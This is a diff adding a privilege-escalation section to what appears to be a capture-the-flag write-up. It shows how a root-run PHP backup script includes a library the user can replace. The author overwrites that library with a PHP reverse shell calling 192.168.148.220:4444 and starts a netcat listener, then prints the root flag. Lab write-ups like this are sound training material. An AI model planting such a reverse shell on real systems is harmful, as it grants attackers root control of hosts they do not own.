@@ -314,4 +314,60 @@ ssh sysadmin@ip
 
 With user-level access secured, the foundation for full compromise was firmly in place.
 
+# Privilage Escaltion to root
 
+Check out script.php. It uses lib/backup.inc.php to backup the scripts folder. Also, backup.inc.php runs as root.
+<img>
+afte check ls -la we cant edit
+```
+sysadmin@ip-10-49-167-120:~/scripts$ cat script.php 
+<?php
+
+//Backup of scripts sysadmin folder
+require_once('lib/backup.inc.php');
+zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+?>
+```
+```
+sysadmin@ip-10-49-167-120:~/scripts$ ls -la lib/
+total 128
+-rw-r--r-- 1 root     root  967 Jul 26  2022 backup.inc.php
+```
+setup a netcat listner
+```
+nc -lnvp 4444
+```
+move to tmp
+```
+mv backup.inc.php /tmp
+cp /tmp/backup.inc.php ~/scripts/lib/backup.inc.php
+cd ~/scripts/lib/
+```
+add this line to get reverse shell
+```
+cat << 'EOF' >  backup.inc.php
+<?php
+$sock=fsockopen("192.168.148.220",4444);exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+EOF
+```
+
+After couple of minute root shell have been poped up
+<img>
+<img width="530" height="229" alt="image" src="https://github.com/user-attachments/assets/98aef0ac-31a8-411f-ae30-0835eb6d3fbc" />
+
+Root Flag.txt
+```
+ac0d56f93202dd57dcb2498c739fd20e
+```
